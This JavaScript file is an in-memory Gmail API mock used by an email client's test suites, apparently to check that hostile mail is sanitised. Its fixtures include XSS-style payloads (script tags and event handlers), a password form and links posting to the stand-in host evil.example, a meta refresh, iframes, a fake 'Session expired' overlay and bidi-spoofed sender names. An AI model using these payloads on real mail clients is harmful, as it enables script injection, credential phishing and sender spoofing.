// A Gmail mocked in memory for the test suites: labels, messages with parts, drafts, a history
// log, and answers for every endpoint the adapter uses, including the batch and upload ones. The
// unit test drives it through fetch, the browser harness through Playwright routes; both hand it
// (method, url, body, headers) and get { status, json } or { status, contentType, text } back.
const fs = require("fs");
const path = require("path");

const FX = path.join(__dirname, "fixtures");
const PNG = Buffer.from("iVBORw0KGgoAAAANSUhEUgAAAAIAAAACCAYAAABytg0kAAAAEklEQVR42mP8z8DwHwAFBQIAX8jx0gAAAABJRU5ErkJggg==", "base64");
const ZIP = Buffer.from("UEsDBBQAAAAAAI8CX12Tpho8uAEAALgBAAAKAAAAc3JjL21haW4uY2ludCBtYWluKCl7cmV0dXJuIDA7fQppbnQgbWFpbigpe3JldHVybiAwO30KaW50IG1haW4oKXtyZXR1cm4gMDt9CmludCBtYWluKCl7cmV0dXJuIDA7fQppbnQgbWFpbigpe3JldHVybiAwO30KaW50IG1haW4oKXtyZXR1cm4gMDt9CmludCBtYWluKCl7cmV0dXJuIDA7fQppbnQgbWFpbigpe3JldHVybiAwO30KaW50IG1haW4oKXtyZXR1cm4gMDt9CmludCBtYWluKCl7cmV0dXJuIDA7fQppbnQgbWFpbigpe3JldHVybiAwO30KaW50IG1haW4oKXtyZXR1cm4gMDt9CmludCBtYWluKCl7cmV0dXJuIDA7fQppbnQgbWFpbigpe3JldHVybiAwO30KaW50IG1haW4oKXtyZXR1cm4gMDt9CmludCBtYWluKCl7cmV0dXJuIDA7fQppbnQgbWFpbigpe3JldHVybiAwO30KaW50IG1haW4oKXtyZXR1cm4gMDt9CmludCBtYWluKCl7cmV0dXJuIDA7fQppbnQgbWFpbigpe3JldHVybiAwO30KUEsDBBQAAAAAAI8CX10gMDo2BgAAAAYAAAAJAAAAUkVBRE1FLm1kaGVsbG8KUEsBAhQDFAAAAAAAjwJfXZOmGjy4AQAAuAEAAAoAAAAAAAAAAAAAAIABAAAAAHNyYy9tYWluLmNQSwECFAMUAAAAAACPAl9dIDA6NgYAAAAGAAAACQAAAAAAAAAAAAAAgAHgAQAAUkVBRE1FLm1kUEsFBgAAAAACAAIAbwAAAA0CAAAAAA==", "base64");
const b64url = buf => Buffer.from(buf).toString("base64url");
const now = Math.floor(Date.now() / 1000);
const RLO = "‮", PDF = "‬", RLI = "⁧", PDI = "⁩";

// The files every third message carries, read as the fixtures the Yahoo suites use.
const fixtureFiles = () => [
  { name: "report.pdf", type: "application/pdf", bytes: fs.readFileSync(path.join(FX, "report.pdf")) },
  { name: "data.csv", type: "text/csv", bytes: Buffer.from("name,qty\nZ80,2\n6502,1\n") },
  { name: "src.zip", type: "application/zip", bytes: ZIP },
  { name: "photo.png", type: "image/png", bytes: PNG },
  { name: "cv.docx", type: "application/vnd.openxmlformats-officedocument.wordprocessingml.document", bytes: fs.readFileSync(path.join(FX, "cv.docx")) },
  { name: "budget.xlsx", type: "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet", bytes: fs.readFileSync(path.join(FX, "budget.xlsx")) },
  { name: "deck.pptx", type: "application/vnd.openxmlformats-officedocument.presentationml.presentation", bytes: Buffer.from("not really a deck") },
];

// What a hostile sender can plant, as the Yahoo harness plants it: scripts, forms, frames, a
// forged header, an overlay, data: URLs that are not images.
const UNSAFE = `<script>parent.pwned = 1</script><img id="h-img" src="data:," onerror="parent.pwned = 1">` +
  `<form id="h-form" action="https://evil.example/"><input id="h-input" name="pw"><button>Go</button></form>` +
  `<a id="h-link" href="https://evil.example/" ping="https://evil.example/ping" target="_top">link</a>` +
  `<img src="data:," usemap="#m"><map name="m"><area id="h-area" href="https://evil.example/" target="_self" shape="rect" coords="0,0,9,9"></map>` +
  `<svg><a id="h-svga" href="https://evil.example/" target="_self"><text y="9">x</text></a></svg>` +
  `<meta http-equiv="refresh" content="0;url=https://evil.example/"><iframe id="h-frame" src="https://evil.example/"></iframe>` +
  `<object id="h-obj" data="https://evil.example/x"></object><svg id="h-svg" onload="parent.pwned = 1"><circle r="1"/></svg>`;
const FORGE = `<style>.hdr, .hdr * { display: none !important }</style><div id="forge" style="position:fixed;top:0;left:0;width:100%;height:160px;background:#fff;z-index:9">Fake header</div>`;
const OVERLAY = `<div id="overlay" style="position:fixed;inset:0;z-index:2147483647;background:#f00">Session expired</div><img src="data:text/html;base64,PGgxPmhpPC9oMT4="><img src="data:image/png;base64,@@not base64@@">`;
const CARD = `<div id="paper" style="background-color:#ffffff;color:#333333">Card</div>`;
const SPACER = `<img id="spacer" style="min-width:640px;min-height:1px" width="640" height="1" src="data:image/png;base64,${PNG.toString("base64")}">` +
  `<img id="spacer2" style="width:100%;min-height:5px" height="5" src="data:image/png;base64,${PNG.toString("base64")}">`;

function createGmail(opts = {}) {
  const state = {
    profile: { emailAddress: "me@gmail.com", historyId: "1000" },
    labels: [
      ...["INBOX", "SENT", "DRAFT", "TRASH", "SPAM", "STARRED", "UNREAD", "IMPORTANT", "CATEGORY_PROMOTIONS"].map(id => ({ id, name: id, type: "system" })),
      { id: "Label_1", name: "Projects", type: "user", labelListVisibility: "labelShow" },
      { id: "Label_2", name: "Projects/FPGA", type: "user", labelListVisibility: "labelShow" },
      { id: "Label_3", name: "Old stuff", type: "user", labelListVisibility: "labelHide" },
      { id: "Label_4", name: "Travel", type: "user", labelListVisibility: "labelShow" },
      { id: "Label_5", name: "Travel/2025", type: "user", labelListVisibility: "labelShow" },
    ],
    sendAs: [{ sendAsEmail: "me@gmail.com", displayName: "Me Myself", isPrimary: true, signature: "<i>sig</i>", verificationStatus: "accepted" },
      { sendAsEmail: "alias@gmail.com", displayName: "Alias", replyToAddress: "r@x.com", verificationStatus: "accepted" }],
    messages: new Map(), attachments: new Map(), drafts: [], history: [], historyGone: false, nextHistory: 1001,
    calls: [], uploads: [], fail: null, failItems: null, failSaves: 0, failSends: 0, failMoves: 0, listDelay: 0, patchHtml: null, seq: 0, revoked: [], failRevoke: 0,
  };
  const nextId = prefix => `${prefix}${++state.seq}`;
  const record = r => { state.history.push({ id: String(state.nextHistory++), ...r }); state.profile.historyId = String(state.nextHistory - 1); };

  // A message with an HTML body, an inline cid image, files, and the headers a client reads.
  // inline: the text's own images [{ name, type, bytes, cid }], in place of the one picture
  function addMessage({ id, labels, subject, from, to = "Me <me@gmail.com>", cc = "Other <o@x.com>", date = now, html, files = [], inline = null, inReplyTo = null, messageId = null, hostile = "", threadId = null }) {
    const inlineId = `${id}-pic@x`;
    const bodyHtml = html ?? `<p>Body of <b>${id}</b></p><img src="cid:${inlineId}">${SPACER}${CARD}${hostile}`;
    const att = (partId, f, extra = {}) => {
      const aid = `att-${id}-${partId}`;
      state.attachments.set(aid, Buffer.from(f.bytes));
      return { partId, mimeType: f.type, filename: f.name, headers: [{ name: "Content-Type", value: `${f.type}; name="${f.name}"` }, { name: "Content-Disposition", value: `${extra.inline ? "inline" : "attachment"}; filename="${f.name}"` }, ...(extra.cid ? [{ name: "Content-ID", value: `<${extra.cid}>` }] : [])], body: { size: f.bytes.length, attachmentId: aid } };
    };
    const related = { partId: "0", mimeType: "multipart/related", filename: "", headers: [{ name: "Content-Type", value: "multipart/related" }], body: { size: 0 }, parts: [
      { partId: "0.0", mimeType: "text/html", filename: "", headers: [{ name: "Content-Type", value: "text/html; charset=utf-8" }], body: { size: bodyHtml.length, data: b64url(bodyHtml) } },
      ...(inline || [{ name: "pic.png", type: "image/png", bytes: PNG, cid: inlineId }]).map((f, i) => att(`0.${i + 1}`, f, { inline: true, cid: f.cid })),
    ] };
    const parts = [related, ...files.map((f, i) => att(String(i + 1), f))];
    const headers = [
      { name: "Subject", value: subject }, { name: "From", value: from }, { name: "To", value: to }, ...(cc ? [{ name: "Cc", value: cc }] : []),
      { name: "Message-ID", value: messageId || `<${id}@x.com>` }, { name: "Date", value: new Date(date * 1000).toUTCString() },
      ...(inReplyTo ? [{ name: "In-Reply-To", value: inReplyTo }, { name: "References", value: inReplyTo }] : []),
    ];
    state.messages.set(id, { id, threadId: threadId || `t-${id}`, labelIds: labels, snippet: "snip", internalDate: String(date * 1000), sizeEstimate: 1000 + bodyHtml.length,
      payload: { partId: "", mimeType: "multipart/mixed", filename: "", headers, body: { size: 0 }, parts } });
    return state.messages.get(id);
  }
  state.addMessage = addMessage;

  // The mailbox: eight in Inbox (odd ones unread, one starred), five in Projects (hostile, with
  // bidi-spoofed names in Projects/FPGA), Travel/2025, Sent, a draft answering m3 with a file,
  // Spam and Trash. Every third message carries the fixture files.
  const fill = (prefix, n, labels, extra = {}) => {
    for (let i = 1; i <= n; i++) {
      const id = `${prefix}${i}`;
      const lab = [...labels, ...(i % 2 ? ["UNREAD"] : [])];
      const spoof = extra.spoof;
      addMessage({ id, labels: lab, subject: spoof ? `Pay ${RLO}eulav${PDF} ${i}` : `Subject ${prefix}-${i}`, from: spoof ? `"Bob${RLI}evil${PDI}" <s${i}@x.com>` : `"Sender ${i}" <s${i}@x.com>`,
        date: now - i * 40000 - (extra.age || 0), files: i % 3 === 0 ? fixtureFiles() : [], hostile: extra.hostile ? UNSAFE + FORGE : FORGE, ...(extra.labelsOf?.(i) || {}) });
    }
  };
  fill("m", 8, ["INBOX"]);
  state.messages.get("m2").labelIds.push("STARRED");
  fill("p", 5, ["Label_1"], { hostile: true, age: 1000 });
  fill("f", 3, ["Label_2"], { spoof: true, age: 2000 });
  state.messages.get("f1").labelIds.push("STARRED");
  fill("v", 4, ["Label_5"], { age: 3000 });
  fill("s", 8, ["SENT"], { age: 4000 });
  for (const id of ["s1", "s3", "s5", "s7"]) state.messages.get(id).labelIds = ["SENT"];
  fill("j", 2, ["SPAM"], { age: 5000 });
  fill("t", 1, ["TRASH"], { age: 6000 });
  for (const id of ["j1", "t1"]) state.messages.get(id).labelIds = state.messages.get(id).labelIds.filter(l => l !== "UNREAD");
  addMessage({ id: "d1", labels: ["DRAFT"], subject: "Re: Subject m-3", from: "Me Myself <me@gmail.com>", to: "s3@x.com", cc: "", inReplyTo: "<m3@x.com>", threadId: "t-m3", date: now - 500,
    html: `<p>Draft body <img src="cid:d1-pic@x"></p>${OVERLAY}`, files: [{ name: "notes.txt", type: "text/plain", bytes: Buffer.from("draft notes\n") }] });
  state.drafts.push({ id: "r-d1", message: { id: "d1" } });
  if (opts.setup) opts.setup(state);

  const counts = id => { const all = [...state.messages.values()].filter(m => m.labelIds.includes(id)); return { messagesTotal: all.length, messagesUnread: all.filter(m => m.labelIds.includes("UNREAD")).length }; };
  const err = (code, message) => ({ status: code, json: { error: { code, message, errors: [{ reason: code === 404 ? "notFound" : "backendError" }] } } });
  const ok = json => ({ status: 200, json });

  function listMessages(q) {
    const labels = q.getAll("labelIds");
    const search = q.get("q") || "";
    const spamTrash = q.get("includeSpamTrash") === "true";
    let all = [...state.messages.values()].filter(m => labels.every(l => m.labelIds.includes(l)) && (spamTrash || labels.some(l => l === "SPAM" || l === "TRASH") || !m.labelIds.some(l => l === "SPAM" || l === "TRASH")));
    // The search terms the suites use: flags, label names (an OR group of them is a union), a
    // word in the subject, an address, a message id.
    const labelOf = t => { const raw = t.replace(/^-?label:"?|"?$/g, ""); const name = raw.replace(/-/g, " ").toLowerCase(); return state.labels.find(x => x.name.toLowerCase() === name || x.name.toLowerCase() === raw.toLowerCase()); };
    const any = [], not = [], addr = [];
    const hasOr = /\bOR\b/.test(search);
    for (const t of search.replace(/[()]/g, " ").match(/-?label:"[^"]*"|\S+/g) || []) {
      if (t === "is:unread") all = all.filter(m => m.labelIds.includes("UNREAD"));
      else if (t === "is:read") all = all.filter(m => !m.labelIds.includes("UNREAD"));
      else if (t === "is:starred") all = all.filter(m => m.labelIds.includes("STARRED"));
      else if (t === "-is:starred") all = all.filter(m => !m.labelIds.includes("STARRED"));
      else if (/^-label:/.test(t)) not.push(labelOf(t)?.id);
      else if (/^label:/.test(t)) any.push(labelOf(t)?.id);
      else if (/^rfc822msgid:/.test(t)) all = all.filter(m => m.payload.headers.some(h => h.name === "Message-ID" && h.value === t.slice(12)));
      else if (/^-?(from|to|cc):/.test(t)) { const v = t.replace(/^-?\w+:|[()"]/g, "").toLowerCase(); const f = t.replace(/^-/, "").split(":")[0]; const hit = m => m.payload.headers.some(h => h.name.toLowerCase() === f && h.value.toLowerCase().includes(v)); if (t.startsWith("-")) all = all.filter(m => !hit(m)); else addr.push(hit); }
      else if (t === "OR") continue;
      else if (/^has:|^after:|^before:|^subject:/.test(t)) continue;
      else { const w = t.replace(/^-|^"|"$/g, "").toLowerCase(); const hit = m => m.payload.headers.some(h => h.name === "Subject" && h.value.toLowerCase().includes(w)) || (m.id.toLowerCase().includes(w)); all = all.filter(m => t.startsWith("-") ? !hit(m) : hit(m)); }
    }
    if (addr.length) all = all.filter(m => hasOr ? addr.some(hit => hit(m)) : addr.every(hit => hit(m)));
    if (any.length) all = all.filter(m => any.some(id => id && m.labelIds.includes(id)));
    if (not.length) all = all.filter(m => !not.some(id => id && m.labelIds.includes(id)));
    all.sort((a, b) => Number(b.internalDate) - Number(a.internalDate));
    const max = Number(q.get("maxResults") || 100), at = Number((q.get("pageToken") || "p0").slice(1));
    const page = all.slice(at, at + max);
    return ok({ messages: page.map(m => ({ id: m.id, threadId: m.threadId })), resultSizeEstimate: all.length, ...(at + max < all.length ? { nextPageToken: `p${at + max}` } : {}) });
  }

  // Strips a message to the fields a request named (format=metadata/minimal, fields=...).
  function view(m, q) {
    const fields = q.get("fields") || "";
    if (q.get("format") === "minimal") return { id: m.id, threadId: m.threadId, labelIds: m.labelIds, snippet: m.snippet, internalDate: m.internalDate, sizeEstimate: m.sizeEstimate };
    const strip = p => { const out = { partId: p.partId, mimeType: p.mimeType, filename: p.filename, headers: p.headers, body: { size: p.body.size, ...(p.body.attachmentId ? { attachmentId: p.body.attachmentId } : {}), ...(fields.includes("payload)") || fields === "" || fields.includes("payload") && !fields.includes("body/size") ? (p.body.data ? { data: p.body.data } : {}) : {}) } }; if (p.parts) out.parts = p.parts.map(strip); return out; };
    const payload = strip(m.payload);
    if (q.get("format") === "metadata") { const wanted = q.getAll("metadataHeaders").map(x => x.toLowerCase()); return { id: m.id, threadId: m.threadId, labelIds: m.labelIds, internalDate: m.internalDate, sizeEstimate: m.sizeEstimate, payload: { mimeType: m.payload.mimeType, headers: m.payload.headers.filter(h => wanted.includes(h.name.toLowerCase())) } }; }
    return { id: m.id, threadId: m.threadId, labelIds: m.labelIds, snippet: m.snippet, internalDate: m.internalDate, sizeEstimate: m.sizeEstimate, payload };
  }

  function modify(ids, add = [], remove = []) {
    for (const id of ids) {
      const m = state.messages.get(id); if (!m) continue;
      const before = m.labelIds.slice();
      m.labelIds = [...new Set([...m.labelIds.filter(l => !remove.includes(l)), ...add])];
      if (remove.some(l => before.includes(l))) record({ labelsRemoved: [{ message: { id, labelIds: m.labelIds }, labelIds: remove.filter(l => before.includes(l)) }] });
      if (add.some(l => !before.includes(l))) record({ labelsAdded: [{ message: { id, labelIds: m.labelIds }, labelIds: add.filter(l => !before.includes(l)) }] });
    }
  }
  function remove(ids) { for (const id of ids) { const m = state.messages.get(id); if (!m) continue; state.messages.delete(id); record({ messagesDeleted: [{ message: { id, labelIds: m.labelIds } }] }); } }
  // A message arriving from outside: Inbox, unread, into the history.
  state.deliver = (id, subject, from = `"New Sender" <new@x.com>`) => { const m = addMessage({ id, labels: ["INBOX", "UNREAD"], subject, from, date: now + 60 }); record({ messagesAdded: [{ message: { id, labelIds: m.labelIds } }] }); return m; };

  // One request. body: a string (JSON, or the multipart of a batch or an upload).
  function respond(method, url, body, headers = {}) {
    const h = {}; for (const [k, v] of Object.entries(headers)) h[k.toLowerCase()] = v;
    const u = new URL(url), q = u.searchParams;
    // Google's revoke endpoint: the token comes in the form body; a revoked token is refused after
    if (u.hostname === "oauth2.googleapis.com" && u.pathname === "/revoke") {
      const t = new URLSearchParams(String(body || "")).get("token");
      state.calls.push({ method, path: "/revoke", q: Object.fromEntries(q), body: null, auth: "" });
      if (state.failRevoke > 0) { state.failRevoke--; return { status: 503, json: { error: "temporarily_unavailable" } }; }
      if (!t) return { status: 400, json: { error: "invalid_request" } };
      state.revoked.push(t);
      return { status: 200, json: {} };
    }
    const p = u.pathname.replace(/^\/gmail\/v1\/users\/me/, "").replace(/^\/upload\/gmail\/v1\/users\/me/, "/upload");
    if (u.pathname === "/batch/gmail/v1") return batchAnswer(body, h);
    const qo = Object.fromEntries(q); if (q.has("labelIds")) qo.labelIds = q.getAll("labelIds").join(",");
    state.calls.push({ method, path: p, q: qo, body: body && typeof body === "string" && body.startsWith("{") ? JSON.parse(body) : null, auth: h.authorization || "" });
    if (state.fail?.times > 0) { state.fail.times--; return { status: state.fail.status, json: state.fail.body || { error: { code: state.fail.status, message: "injected" } } }; }
    if (!/^Bearer (test|tok\d+)$/.test(h.authorization || "") || state.revoked.includes(h.authorization.slice(7))) return err(401, "Invalid Credentials");
    let m;
    if (p === "/profile") return ok({ ...state.profile, messagesTotal: state.messages.size });
    if (p === "/labels" && method === "GET") return ok({ labels: state.labels });
    if (p === "/labels" && method === "POST") { const j = JSON.parse(body); if (state.labels.some(l => l.name === j.name)) return err(409, "Label name exists or conflicts"); const l = { id: `Label_${100 + state.labels.length}`, name: j.name, type: "user", labelListVisibility: "labelShow" }; state.labels.push(l); return ok(l); }
    if ((m = p.match(/^\/labels\/([^/]+)$/))) {
      const l = state.labels.find(x => x.id === m[1]); if (!l) return err(404, "Not Found");
      if (method === "PATCH") { l.name = JSON.parse(body).name; return ok(l); }
      if (method === "DELETE") { state.labels.splice(state.labels.indexOf(l), 1); for (const x of state.messages.values()) x.labelIds = x.labelIds.filter(i => i !== l.id); return { status: 204, json: null }; }
      return ok({ id: l.id, name: l.name, type: l.type, ...counts(l.id) });
    }
    if (p === "/history") { if (state.historyGone) return err(404, "Start history ID is too old"); const from = Number(q.get("startHistoryId") || 0); return ok({ history: state.history.filter(r => Number(r.id) > from), historyId: state.profile.historyId }); }
    if (p === "/messages" && method === "GET") return listMessages(q);
    if (p === "/messages/batchModify") { if (state.failMoves > 0) { state.failMoves--; return err(500, "Backend Error"); } const j = JSON.parse(body); modify(j.ids, j.addLabelIds || [], j.removeLabelIds || []); return { status: 204, json: null }; }
    if ((m = p.match(/^\/messages\/([^/]+)\/modify$/)) && method === "POST") { if (state.failMoves > 0) { state.failMoves--; return err(500, "Backend Error"); } const x = state.messages.get(m[1]); if (!x) return err(404, "Not Found"); const j = JSON.parse(body); modify([x.id], j.addLabelIds || [], j.removeLabelIds || []); return ok({ id: x.id, threadId: x.threadId, labelIds: x.labelIds }); }
    if (p === "/messages/batchDelete") { remove(JSON.parse(body).ids); return { status: 204, json: null }; }
    if ((m = p.match(/^\/messages\/([^/]+)\/attachments\/(.+)$/))) { const a = state.attachments.get(m[2]); return a ? ok({ size: a.length, data: b64url(a) }) : err(404, "Not Found"); }
    if ((m = p.match(/^\/messages\/([^/]+)$/))) { const x = state.messages.get(m[1]); if (!x) return err(404, "Requested entity was not found."); if (method === "DELETE") { remove([x.id]); return { status: 204, json: null }; } const v = view(x, q); if (state.patchHtml && q.get("format") === "full" && !q.get("fields")?.startsWith("payload")) patchHtml(v, x.id); return ok(v); }
    // no drafts: no body at all, as Gmail answers an empty list under a fields mask
    if (p === "/drafts" && method === "GET") return state.drafts.length ? ok({ drafts: state.drafts.map(d => ({ id: d.id, message: { id: d.message.id } })) }) : { status: 200, json: null };
    if ((m = p.match(/^\/drafts\/([^/]+)$/)) && method === "DELETE") { const i = state.drafts.findIndex(d => d.id === m[1]); if (i < 0) return err(404, "Not Found"); remove([state.drafts[i].message.id]); state.drafts.splice(i, 1); return { status: 204, json: null }; }
    if (p === "/settings/sendAs") return ok({ sendAs: state.sendAs });
    if (p.startsWith("/upload/")) return uploadAnswer(method, p, body, h);
    return err(404, `no mock for ${method} ${p}`);
  }

  // A test may rewrite a message's HTML as it is answered (patchHtml(id, html) -> html).
  function patchHtml(v, id) {
    const walk = p => { if (p.mimeType === "text/html" && p.body?.data) { const html = state.patchHtml(id, Buffer.from(p.body.data, "base64url").toString()); p.body = { ...p.body, data: b64url(html) }; } (p.parts || []).forEach(walk); };
    walk(v.payload);
  }

  function batchAnswer(body, h) {
    const boundary = (h["content-type"] || "").match(/boundary=(.+)$/)[1];
    const items = body.split(`--${boundary}`).slice(1, -1);
    const answers = items.map((it, i) => {
      const [, m, pth] = it.match(/\r\n\r\n(GET|POST|PUT|PATCH|DELETE) (\S+) HTTP\/1\.1/);
      const jsonAt = it.indexOf("Content-Type: application/json");
      const inner = jsonAt >= 0 ? it.slice(jsonAt).split("\r\n\r\n")[1].trim() : null;
      // failItems: { status, times, match? }: that many items answered with that status, as Gmail
      // refuses single items of a batch under load
      const f = state.failItems;
      const r = f?.times > 0 && (!f.match || f.match.test(pth)) ? (f.times--, err(f.status, "injected item failure")) : respond(m, "https://gmail.googleapis.com" + pth, inner, h);
      return `--resp\r\nContent-Type: application/http\r\nContent-ID: <response-item${i}>\r\n\r\nHTTP/1.1 ${r.status} X\r\nContent-Type: application/json\r\n\r\n${r.json == null ? "" : JSON.stringify(r.json)}\r\n`;
    });
    return { status: 200, contentType: "multipart/mixed; boundary=resp", text: answers.join("") + "--resp--\r\n" };
  }

  // Drafts and sends arrive as multipart/related: JSON, then the message. The message is kept as
  // a mailbox message with its headers, and, when the caller lent ext/mime.js (opts.mime), with
  // its HTML and files, so a saved draft reopens whole and a sent copy can be read.
  function uploadAnswer(method, p, body, h) {
    const boundary = (h["content-type"] || "").match(/boundary=(.+)$/)[1];
    const parts = body.split(`--${boundary}`).slice(1, -1).map(s => s.replace(/^\r\n/, ""));
    const meta = JSON.parse(parts[0].split("\r\n\r\n")[1]);
    const raw = parts[1].split("\r\n\r\n").slice(1).join("\r\n\r\n").replace(/\r\n$/, "");
    state.uploads.push({ path: p, method, meta, raw });
    const head = raw.split("\r\n\r\n")[0].replace(/\r\n[ \t]+/g, " ");
    const hdr = name => (head.split("\r\n").find(l => l.toLowerCase().startsWith(name + ":")) || "").slice(name.length + 1).trim();
    const content = () => {
      if (!opts.mime) return { html: "<p>stored</p>", files: [] };
      const parsed = opts.mime.listParts(Buffer.from(raw, "latin1"));
      const html = parsed.parts.filter(x => x.type === "text/html" && !x.filename).map(x => Buffer.from(opts.mime.extract(parsed, x.partId).bytes).toString()).join("");
      // a part's Content-ID, from its headers just before its body; the ones the HTML shows stay inline
      const cidOf = x => (parsed.s.slice(parsed.s.lastIndexOf("\r\n--", x.start), x.start).match(/^Content-ID:\s*<([^>]+)>/im) || [])[1] || "";
      const shown = x => cidOf(x) && html.includes(`cid:${cidOf(x)}`);
      const entry = x => ({ name: x.filename, type: x.type, bytes: Buffer.from(opts.mime.extract(parsed, x.partId).bytes), cid: cidOf(x) });
      const inline = parsed.parts.filter(x => x.filename && shown(x)).map(entry);
      const files = parsed.parts.filter(x => x.filename && !shown(x) && !/^inline-\d+\./.test(x.filename)).map(entry);
      return { html, files, inline };
    };
    const store = (id, labels) => addMessage({ id, labels, subject: hdr("subject"), from: hdr("from"), to: hdr("to"), cc: hdr("cc"), inReplyTo: hdr("in-reply-to") || null, messageId: hdr("message-id"), threadId: meta.message?.threadId || meta.threadId || null, ...content(), date: now + 10 });
    let m;
    if (p === "/upload/drafts" && method === "POST") { if (state.failSaves > 0) { state.failSaves--; return err(500, "save failed"); } const id = nextId("dm"), d = { id: nextId("r-new"), message: { id, threadId: meta.message?.threadId } }; store(id, ["DRAFT"]); record({ messagesAdded: [{ message: { id, labelIds: ["DRAFT"] } }] }); state.drafts.push(d); return ok({ id: d.id, message: { id, threadId: d.message.threadId || "tnew", labelIds: ["DRAFT"] } }); }
    if ((m = p.match(/^\/upload\/drafts\/([^/]+)$/)) && method === "PUT") { if (state.failSaves > 0) { state.failSaves--; return err(500, "save failed"); } const d = state.drafts.find(x => x.id === m[1]); if (!d) return err(404, "Not Found"); remove([d.message.id]); const id = nextId("dm"); store(id, ["DRAFT"]); record({ messagesAdded: [{ message: { id, labelIds: ["DRAFT"] } }] }); d.message = { id, threadId: meta.message?.threadId }; return ok({ id: d.id, message: { id, threadId: d.message.threadId || "tnew", labelIds: ["DRAFT"] } }); }
    if (p === "/upload/drafts/send") { if (state.failSends > 0) { state.failSends--; return err(500, "Internal error"); } const i = state.drafts.findIndex(x => x.id === meta.id); if (i < 0) return err(404, "Not Found"); remove([state.drafts[i].message.id]); state.drafts.splice(i, 1); const id = nextId("sent"); store(id, ["SENT"]); record({ messagesAdded: [{ message: { id, labelIds: ["SENT"] } }] }); return ok({ id, threadId: meta.message?.threadId || "tnew", labelIds: ["SENT"] }); }
    if (p === "/upload/messages/send") { if (state.failSends > 0) { state.failSends--; return err(500, "Internal error"); } const id = nextId("sent"); store(id, ["SENT"]); record({ messagesAdded: [{ message: { id, labelIds: ["SENT"] } }] }); return ok({ id, threadId: meta.threadId || "tnew", labelIds: ["SENT"] }); }
    return err(404, `no mock for ${method} ${p}`);
  }

  return { state, respond, counts };
}

module.exports = { createGmail, PNG, FX };
